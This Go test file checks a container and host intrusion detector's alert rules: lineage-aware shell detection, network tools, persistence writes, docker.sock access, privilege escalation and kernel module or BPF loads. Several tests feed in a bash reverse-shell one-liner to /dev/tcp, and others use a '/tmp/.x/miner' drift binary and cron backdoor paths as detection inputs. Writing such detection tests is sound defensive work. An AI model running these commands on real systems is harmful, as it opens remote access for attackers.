package detector

import (
	"testing"

	"kernelwatch/internal/alerter"
	"kernelwatch/internal/collector"
	"kernelwatch/internal/config"
	"kernelwatch/internal/container"
	"kernelwatch/internal/suppress"
)

func newTestDetector(t *testing.T) *Detector {
	t.Helper()
	return New(&config.Config{Mode: "alert", AncestryDepth: 5})
}

func testContainer() *container.Info {
	return &container.Info{ID: "abc123def4567890", ShortID: "abc123def456", Name: "app", ImageName: "app:latest"}
}

// containerExec builds a monitored container execve event.
func containerExec(filename, cmdline string, ancestry []string) collector.Event {
	return collector.Event{
		PID:       1234,
		Type:      collector.EventExecve,
		Filename:  filename,
		Args:      []string{filename},
		CmdLine:   cmdline,
		Ancestry:  ancestry,
		Container: testContainer(),
	}
}

func byRule(alerts []*alerter.Alert, ruleID string) *alerter.Alert {
	for _, a := range alerts {
		if a != nil && a.RuleID == ruleID {
			return a
		}
	}
	return nil
}

func TestLineageAwareShellDetection(t *testing.T) {
	cases := []struct {
		name      string
		ancestry  []string
		wantAlert bool
		wantSev   alerter.Severity
	}{
		{"shell from cron is suppressed", []string{"sh", "cron"}, false, ""},
		{"shell from entrypoint supervisor is suppressed", []string{"containerd-shim"}, false, ""},
		{"shell from nginx is critical (web-shell)", []string{"sh", "nginx"}, true, alerter.SeverityCritical},
		{"shell from php-fpm is critical", []string{"php-fpm"}, true, alerter.SeverityCritical},
		{"shell from unknown parent is high", []string{"weirdproc"}, true, alerter.SeverityHigh},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := newTestDetector(t)
			shell := byRule(d.Check(containerExec("/bin/bash", "bash", tc.ancestry)), "shell_in_container")
			if tc.wantAlert && shell == nil {
				t.Fatalf("expected a shell alert, got none")
			}
			if !tc.wantAlert && shell != nil {
				t.Fatalf("expected suppression, got alert: %s", shell.Reason)
			}
			if tc.wantAlert && shell.Severity != tc.wantSev {
				t.Fatalf("severity = %s, want %s", shell.Severity, tc.wantSev)
			}
		})
	}
}

func TestReverseShellAlwaysCritical(t *testing.T) {
	d := newTestDetector(t)
	// Even spawned by a "trusted" parent, a reverse-shell payload is critical.
	e := containerExec("/bin/bash", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"cron"})
	if a := byRule(d.Check(e), "reverse_shell"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical reverse_shell alert, got %#v", a)
	}
}

func TestNetworkToolLineage(t *testing.T) {
	d1 := newTestDetector(t)
	if a := byRule(d1.Check(containerExec("/usr/bin/curl", "curl http://health", []string{"sh", "cron"})), "network_tool"); a != nil {
		t.Fatalf("curl from cron healthcheck should be suppressed, got %s", a.Reason)
	}
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(containerExec("/usr/bin/curl", "curl http://evil", []string{"php-fpm"})), "network_tool"); a == nil || a.Severity != alerter.SeverityHigh {
		t.Fatalf("curl from php-fpm should be High, got %#v", a)
	}
	// Bare `php` (the CLI runtime, e.g. artisan) is NOT network-facing → Medium, not High.
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(containerExec("/usr/bin/curl", "curl http://x", []string{"php"})), "network_tool"); a == nil || a.Severity != alerter.SeverityMedium {
		t.Fatalf("curl from bare php should be Medium (not escalated), got %#v", a)
	}
}

func TestContainerDrift(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(containerExec("/tmp/.x/miner", "/tmp/.x/miner", []string{"sh"})), "container_drift"); a == nil {
		t.Fatal("expected drift alert for binary in /tmp")
	}
}

func TestExceptionSuppresses(t *testing.T) {
	d := New(&config.Config{Mode: "alert", AncestryDepth: 5, DetectionExceptions: []string{"trusted-image"}})
	e := containerExec("/bin/bash", "bash", []string{"nginx"})
	e.Container.ImageName = "registry/trusted-image:1.0"
	if alerts := d.Check(e); len(alerts) != 0 {
		t.Fatalf("exception should suppress all alerts, got %d", len(alerts))
	}
}

func TestDynamicSuppression(t *testing.T) {
	d := newTestDetector(t)
	// Baseline: curl from php-fpm fires a network_tool alert.
	e := containerExec("/usr/bin/curl", "curl http://x", []string{"php-fpm"})
	if byRule(d.Check(e), "network_tool") == nil {
		t.Fatal("expected network_tool alert before suppression")
	}

	// Operator marks this exact (rule, process) as a false positive.
	d.SetSuppressions(suppress.Set{{RuleID: "network_tool", ProcessName: "curl"}})
	e2 := containerExec("/usr/bin/curl", "curl http://x", []string{"php-fpm"})
	if a := byRule(d.Check(e2), "network_tool"); a != nil {
		t.Fatalf("suppression should drop the network_tool alert, got %s", a.Reason)
	}

	// A different rule on the same event is unaffected.
	d.SetSuppressions(suppress.Set{{RuleID: "network_tool", ProcessName: "curl"}})
	rev := containerExec("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"php-fpm"})
	if byRule(d.Check(rev), "reverse_shell") == nil {
		t.Fatal("suppressing network_tool must not affect reverse_shell")
	}

	// Clearing suppressions restores the alert. Use a distinct PID so the
	// short-window dedup (keyed by rule|container|pid) doesn't hide it.
	d.SetSuppressions(nil)
	e3 := containerExec("/usr/bin/curl", "curl http://x", []string{"php-fpm"})
	e3.PID = 9999
	if byRule(d.Check(e3), "network_tool") == nil {
		t.Fatal("clearing suppressions should restore the alert")
	}
}

// ── Host-scope detection (KW_MONITOR_HOST) ───────────────────────────────────

// hostExec builds a host (no container) execve event.
func hostExec(filename, cmdline string, ancestry []string) collector.Event {
	return collector.Event{
		PID: 2222, Type: collector.EventExecve, Filename: filename,
		Args: []string{filename}, CmdLine: cmdline, Ancestry: ancestry,
		ProcessName: baseName(filename), Container: nil,
	}
}

// hostOpen builds a host (no container) open event. comm is the opener's name.
func hostOpen(filename string, flags uint64, comm string, ancestry []string) collector.Event {
	return collector.Event{
		PID: 2222, Type: collector.EventOpen, Filename: filename, Arg1: flags,
		ProcessName: comm, Ancestry: ancestry, Container: nil,
	}
}

func TestHostScopeIsStamped(t *testing.T) {
	d := newTestDetector(t)
	// A shell spawned by a network-facing service on the host fires the host
	// analog and is stamped scope=host.
	a := byRule(d.Check(hostExec("/bin/bash", "bash", []string{"nginx"})), "host_shell_from_service")
	if a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical host_shell_from_service, got %#v", a)
	}
	if a.Scope != alerter.ScopeHost {
		t.Fatalf("host alert must carry scope=host, got %q", a.Scope)
	}
	if a.ContainerID != "" || a.ContainerName != "" {
		t.Fatalf("host alert must have no container identity, got %+v", a)
	}
}

func TestContainerOnlyRulesDoNotFireOnHost(t *testing.T) {
	d := newTestDetector(t)
	// shell_in_container is container-only: an admin shell under sshd on the host
	// must NOT fire it (or anything else).
	alerts := d.Check(hostExec("/bin/bash", "bash", []string{"sshd"}))
	if a := byRule(alerts, "shell_in_container"); a != nil {
		t.Fatalf("shell_in_container must not fire on host, got %s", a.Reason)
	}
	if a := byRule(alerts, "host_shell_from_service"); a != nil {
		t.Fatalf("an interactive admin shell is not a service-spawned shell, got %s", a.Reason)
	}
	if len(alerts) != 0 {
		t.Fatalf("benign interactive host shell should be silent, got %d alerts", len(alerts))
	}
}

func TestHostPrivilegeEscalationLineage(t *testing.T) {
	// sudo in an SSH session is daily ops → suppressed.
	d := newTestDetector(t)
	if a := byRule(d.Check(hostExec("/usr/bin/sudo", "sudo -i", []string{"sshd"})), "privilege_escalation"); a != nil {
		t.Fatalf("sudo under sshd should be suppressed on host, got %s", a.Reason)
	}
	// sudo spawned by a network-facing service → critical.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostExec("/usr/bin/sudo", "sudo id", []string{"nginx"})), "privilege_escalation"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("sudo under nginx should be critical, got %#v", a)
	}
}

func TestHostPackageManager(t *testing.T) {
	// apt under an admin session on the host → suppressed (routine ops).
	d := newTestDetector(t)
	if a := byRule(d.Check(hostExec("/usr/bin/apt", "apt install x", []string{"sshd"})), "package_manager"); a != nil {
		t.Fatalf("apt under sshd should be suppressed on host, got %s", a.Reason)
	}
	// apt spawned by a network-facing service → critical (attacker tooling).
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostExec("/usr/bin/apt", "apt install x", []string{"nginx"})), "package_manager"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("apt under nginx should be critical on host, got %#v", a)
	}
}

func TestHostTmpExec(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(hostExec("/tmp/payload", "/tmp/payload", []string{"bash", "sshd"})), "host_tmp_exec"); a == nil {
		t.Fatal("expected host_tmp_exec for exec from /tmp on host")
	}
	// Build/package lineage exec'ing from a temp dir is benign.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostExec("/tmp/cc123/conftest", "cc", []string{"gcc", "dpkg"})), "host_tmp_exec"); a != nil {
		t.Fatalf("temp-dir exec under build lineage should be suppressed, got %s", a.Reason)
	}
	// /run is excluded on the host (systemd uses it).
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(hostExec("/run/helper", "/run/helper", []string{"systemd"})), "host_tmp_exec"); a != nil {
		t.Fatalf("exec from /run must not fire host_tmp_exec, got %s", a.Reason)
	}
}

func TestHostPersistence(t *testing.T) {
	// Write to a cron dir by an unknown process → persistence.
	d := newTestDetector(t)
	if a := byRule(d.Check(hostOpen("/etc/cron.d/backdoor", oWRONLY|oCREAT, "python3", nil)), "persistence"); a == nil {
		t.Fatal("expected host persistence alert for write to /etc/cron.d")
	}
	// Same write by a trusted writer (dpkg) → suppressed.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostOpen("/etc/cron.d/pkg", oWRONLY|oCREAT, "dpkg", nil)), "persistence"); a != nil {
		t.Fatalf("dpkg writing a cron entry should be suppressed, got %s", a.Reason)
	}
	// authorized_keys under an arbitrary home (substring match) → persistence.
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(hostOpen("/home/deploy/.ssh/authorized_keys", oWRONLY|oAPPEND, "sh", nil)), "persistence"); a == nil {
		t.Fatal("expected persistence alert for authorized_keys write under /home")
	}
}

func TestHostDockerSock(t *testing.T) {
	// Non-Docker process opening the socket → alert.
	d := newTestDetector(t)
	if a := byRule(d.Check(hostOpen("/var/run/docker.sock", oRDWR, "python3", nil)), "host_docker_sock"); a == nil {
		t.Fatal("expected host_docker_sock for python opening docker.sock")
	}
	// A legitimate Docker client → suppressed.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostOpen("/var/run/docker.sock", oRDWR, "dockerd", nil)), "host_docker_sock"); a != nil {
		t.Fatalf("dockerd opening its own socket should be suppressed, got %s", a.Reason)
	}
}

func TestHostUserManipulation(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(hostExec("/usr/sbin/useradd", "useradd evil", []string{"sshd"})), "host_user_manipulation"); a == nil || a.Severity != alerter.SeverityLow {
		t.Fatalf("useradd in admin session should be Low, got %#v", a)
	}
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostExec("/usr/sbin/useradd", "useradd evil", []string{"nginx"})), "host_user_manipulation"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("useradd by network-facing service should be Critical, got %#v", a)
	}
}

func TestHostSensitiveFileRequiresWrite(t *testing.T) {
	// Reads of /etc/passwd are constant on a host → no alert.
	d := newTestDetector(t)
	if a := byRule(d.Check(hostOpen("/etc/passwd", 0, "sshd", nil)), "sensitive_file"); a != nil {
		t.Fatalf("read of /etc/passwd on host must not alert, got %s", a.Reason)
	}
	// A write to /etc/passwd is interesting.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(hostOpen("/etc/passwd", oWRONLY, "perl", nil)), "sensitive_file"); a == nil {
		t.Fatal("write to /etc/passwd on host should alert")
	}
}

func TestHostKernelAndBPFLineage(t *testing.T) {
	// Module load by udev/dkms lineage → suppressed; unknown → High.
	d := newTestDetector(t)
	modTrusted := collector.Event{Type: collector.EventModule, ProcessName: "systemd-udevd", Container: nil}
	if a := byRule(d.Check(modTrusted), "kernel_module_load"); a != nil {
		t.Fatalf("udev loading a module on host should be suppressed, got %s", a.Reason)
	}
	d2 := newTestDetector(t)
	modEvil := collector.Event{Type: collector.EventModule, ProcessName: "insmod", Ancestry: []string{"bash", "sshd"}, Container: nil}
	if a := byRule(d2.Check(modEvil), "kernel_module_load"); a == nil || a.Severity != alerter.SeverityHigh {
		t.Fatalf("untrusted module load on host should be High, got %#v", a)
	}
	// BPF load by dockerd → suppressed on host.
	d3 := newTestDetector(t)
	bpfDocker := collector.Event{Type: collector.EventBPF, Arg1: 5, ProcessName: "dockerd", Container: nil}
	if a := byRule(d3.Check(bpfDocker), "bpf_prog_load"); a != nil {
		t.Fatalf("dockerd loading BPF on host should be suppressed, got %s", a.Reason)
	}
}

func TestHostReverseShellAlwaysCritical(t *testing.T) {
	d := newTestDetector(t)
	e := hostExec("/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", []string{"sshd"})
	if a := byRule(d.Check(e), "reverse_shell"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("reverse shell must be critical on host too, got %#v", a)
	}
}

// TestHostRulePathsAreDeliverable guards the no-drift invariant: every host file
// path the detector rules match must be one the collector's host openat
// allowlist actually delivers, else the rule could never fire in production.
func TestHostRulePathsAreDeliverable(t *testing.T) {
	paths := append([]string{}, hostPersistencePrefixes...)
	paths = append(paths,
		"/home/u/.ssh/authorized_keys", // substring persistence
		"/etc/passwd", "/etc/shadow", "/etc/sudoers", // sensitive (write)
		"/var/log/auth.log", "/var/log/syslog", // log tampering
		"/var/run/docker.sock", // docker sock
	)
	for _, p := range paths {
		if !collector.HostOpenWatched(p) {
			t.Fatalf("detector matches host path %q but the collector allowlist drops it (drift)", p)
		}
	}
}

func TestPersistenceWriteDetected(t *testing.T) {
	d := newTestDetector(t)
	// Write-mode open (O_WRONLY|O_CREAT) of a cron path → persistence alert.
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/cron.d/backdoor", Arg1: 0x1 | 0x40, Container: testContainer()}
	if a := byRule(d.Check(e), "persistence"); a == nil {
		t.Fatal("expected persistence alert for write to /etc/cron.d")
	}
	// ld.so.preload write → critical.
	d2 := newTestDetector(t)
	e2 := collector.Event{Type: collector.EventOpen, Filename: "/etc/ld.so.preload", Arg1: 0x2, Container: testContainer()}
	if a := byRule(d2.Check(e2), "persistence"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatalf("expected critical persistence alert for ld.so.preload, got %#v", a)
	}
}

func TestPersistenceReadOnlyIgnored(t *testing.T) {
	d := newTestDetector(t)
	// Read-only open (flags=0) of a cron path must NOT alert persistence.
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/crontab", Arg1: 0, Container: testContainer()}
	if a := byRule(d.Check(e), "persistence"); a != nil {
		t.Fatal("read-only open should not raise a persistence alert")
	}
}

func TestProcessInjection(t *testing.T) {
	d := newTestDetector(t)
	e := collector.Event{Type: collector.EventPtrace, Arg1: 16 /*ATTACH*/, Arg2: 999, Container: testContainer()}
	if a := byRule(d.Check(e), "process_injection"); a == nil || a.Severity != alerter.SeverityHigh {
		t.Fatalf("expected process_injection alert, got %#v", a)
	}
	// A benign ptrace request (TRACEME=0) should not fire.
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(collector.Event{Type: collector.EventPtrace, Arg1: 0, Container: testContainer()}), "process_injection"); a != nil {
		t.Fatal("PTRACE_TRACEME should not raise injection alert")
	}
}

func TestKernelTampering(t *testing.T) {
	d := newTestDetector(t)
	if a := byRule(d.Check(collector.Event{Type: collector.EventModule, Container: testContainer()}), "kernel_module_load"); a == nil || a.Severity != alerter.SeverityCritical {
		t.Fatal("expected critical kernel_module_load alert")
	}
	d2 := newTestDetector(t)
	if a := byRule(d2.Check(collector.Event{Type: collector.EventBPF, Arg1: 5 /*PROG_LOAD*/, Container: testContainer()}), "bpf_prog_load"); a == nil {
		t.Fatal("expected bpf_prog_load alert")
	}
	// A non-load bpf command (e.g. map lookup) should not fire.
	d3 := newTestDetector(t)
	if a := byRule(d3.Check(collector.Event{Type: collector.EventBPF, Arg1: 1, Container: testContainer()}), "bpf_prog_load"); a != nil {
		t.Fatal("non-load bpf command should not raise an alert")
	}
}

func TestSensitiveFileOpen(t *testing.T) {
	d := newTestDetector(t)
	e := collector.Event{Type: collector.EventOpen, Filename: "/etc/shadow", Container: testContainer()}
	if a := byRule(d.Check(e), "sensitive_file"); a == nil {
		t.Fatal("expected sensitive_file alert for /etc/shadow")
	}
}
